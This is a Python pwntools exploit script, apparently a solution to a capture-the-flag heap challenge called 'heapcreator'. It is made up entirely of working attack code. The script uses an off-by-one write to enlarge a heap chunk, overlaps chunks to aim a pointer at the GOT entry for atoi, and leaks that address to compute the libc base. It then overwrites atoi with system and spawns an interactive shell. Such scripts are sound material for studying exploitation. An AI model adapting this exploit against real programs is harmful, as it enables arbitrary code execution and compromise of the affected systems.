#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
cn = process('./heapcreator')
bin = ELF('./heapcreator')
libc = ELF('./libc.so')

def create(size,content):
    cn.recvuntil(":")
    cn.sendline("1")
    cn.recvuntil(":")
    cn.sendline(str(size))
    cn.recvuntil(":")
    cn.sendline(content)

def edit(idx,content):
    cn.recvuntil(":")
    cn.sendline("2")
    cn.recvuntil(":")
    cn.sendline(str(idx))
    cn.recvuntil(":")
    cn.sendline(content)

def show(idx):
    cn.recvuntil(":")
    cn.sendline("3")
    cn.recvuntil(":")
    cn.sendline(str(idx))

def delete(idx):
    cn.recvuntil(":")
    cn.sendline("4")
    cn.recvuntil(":")
    cn.sendline(str(idx))

create(0x18,"0000") # 0
create(0x10,"1111") # 1

edit(0, "a"*0x18 + "\x41")

delete(1)
create(0x30,p64(0)*4 +p64(0x30) +  p64(bin.got['atoi'])) #1
show(1)
cn.recvuntil("Content : ")
data = cn.recvuntil("Done !")

atoi_addr = u64(data.split("\n")[0].ljust(8,"\x00"))
base = atoi_addr - libc.symbols['atoi'] 
print "base:",hex(base)
system = base + libc.symbols['system']
edit(1,p64(system))
cn.sendline('$0')
cn.interactive()
